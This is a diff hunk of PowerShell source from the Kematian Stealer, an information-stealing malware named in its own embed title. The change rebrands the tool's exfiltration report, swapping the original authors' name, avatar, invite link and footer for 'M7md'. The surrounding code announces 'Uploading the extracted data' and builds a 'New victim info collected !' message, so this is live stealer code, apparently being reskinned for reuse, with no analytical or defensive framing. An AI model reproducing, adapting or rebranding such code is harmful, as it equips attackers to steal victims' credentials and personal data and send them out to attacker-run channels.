@@ -1088,21 +1088,21 @@ function Backup-Data {
 
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
-        "username"   = "Kematian"
+        "username"   = "M7md"
         "color"      = "15105570"
-        "avatar_url" = "https://i.imgur.com/6w6qWCB.jpeg"
-        "url"        = "https://discord.com/invite/WJCNUpxnrE"
+        "avatar_url" = "https://cdn.discordapp.com/attachments/1130331261077037087/1240628865131479090/image.png?ex=6670c86b&is=666f76eb&hm=fd2785d640ee0d49b6fe4435a69b6ed8014054795a4f25ca48a3da155bd6579c&"
+        "url"        = "https://discord.com/invite/SCF"
         "embeds"     = @(
             @{
-                "title"       = "Kematian Stealer"
+                "title"       = "M7md eeea"
                 "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
                 "footer"      = @{
-                    "text" = "Made by Kdot, Chainski and EvilByteCode"
+                    "text" = "Made by M7md "
                 }
                 "thumbnail"   = @{
-                    "url" = "https://i.imgur.com/6w6qWCB.jpeg"
+                    "url" = "https://cdn.discordapp.com/attachments/1130331261077037087/1240628865131479090/image.png?ex=6670c86b&is=666f76eb&hm=fd2785d640ee0d49b6fe4435a69b6ed8014054795a4f25ca48a3da155bd6579c&"
                 }
                 "fields"      = @(
                     @{
